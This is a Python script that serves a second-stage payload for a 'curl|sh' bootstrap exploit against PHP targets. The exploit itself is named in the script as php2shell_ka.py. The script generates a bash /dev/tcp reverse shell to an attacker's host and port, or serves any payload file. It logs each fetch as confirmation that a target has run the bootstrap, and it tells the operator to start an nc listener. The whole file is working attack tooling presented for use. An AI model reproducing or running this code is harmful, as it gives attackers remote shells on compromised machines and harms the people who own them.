#!/usr/bin/env python3
"""
serve_stage2.py — host the arbitrary-length stage-2 for the `curl <domain>|sh`
bootstrap. Point your short domain's A record at the box running this, then run
the exploit with `--stage2 <domain>`.

Serves the payload at EVERY path as text/plain (so `curl host` and `curl host/x`
both work) and logs each fetch (your confirmation that the target called out).

  # serve a reverse shell to 10.0.0.5:9001 on port 80
  sudo python3 serve_stage2.py --revshell 10.0.0.5:9001 --port 80

  # serve a custom payload file
  python3 serve_stage2.py --payload ./stage2.sh --port 8080
"""
import argparse, http.server, socketserver, datetime, sys

def revshell(host, port):
    # bash /dev/tcp reverse shell (arbitrary length — no 14-byte limit at stage 2)
    return (f"#!/bin/sh\n"
            f"exec 5<>/dev/tcp/{host}/{port}\n"
            f"cat <&5 | while read line; do $line 2>&5 >&5; done\n")

def main():
    ap = argparse.ArgumentParser(description="host stage-2 payload for curl|sh bootstrap")
    ap.add_argument("--port", type=int, default=8080)
    ap.add_argument("--payload", help="path to a shell-script payload to serve")
    ap.add_argument("--revshell", metavar="HOST:PORT", help="generate+serve a reverse shell")
    a = ap.parse_args()

    payload_path = None
    if a.revshell:
        host, _, port = a.revshell.partition(":")
        static_body = revshell(host, port).encode()
        print(f"[*] serving reverse shell -> {host}:{port}  (start your listener: nc -lvnp {port})")
    elif a.payload:
        payload_path = a.payload   # re-read per request so edits are live
        static_body = None
        print(f"[*] serving payload from {a.payload} (re-read per request — edit it live)")
    else:
        print("[-] need --payload FILE or --revshell HOST:PORT"); return 1

    class H(http.server.BaseHTTPRequestHandler):
        def do_GET(self):
            body = static_body
            if payload_path is not None:
                try: body = open(payload_path, "rb").read()
                except Exception: body = b"# payload unreadable\n"
            ts = datetime.datetime.now().strftime("%H:%M:%S")
            print(f"[+] {ts}  FETCH from {self.client_address[0]}  {self.command} {self.path}  "
                  f"UA={self.headers.get('User-Agent','?')}  -> served {len(body)}B (target executed bootstrap)",
                  flush=True)
            self.send_response(200)
            self.send_header("Content-Type", "text/plain")
            self.send_header("Content-Length", str(len(body)))
            self.end_headers()
            self.wfile.write(body)
        def log_message(self, *a): pass   # we do our own logging

    socketserver.TCPServer.allow_reuse_address = True
    with socketserver.TCPServer(("0.0.0.0", a.port), H) as srv:
        print(f"[*] listening on 0.0.0.0:{a.port}  — point your short domain's A record here,")
        print(f"    then run: php2shell_ka.py -u <target> --stage2 <your-domain>")
        try: srv.serve_forever()
        except KeyboardInterrupt: print("\n[*] stopped")
    return 0

if __name__ == "__main__":
    sys.exit(main())
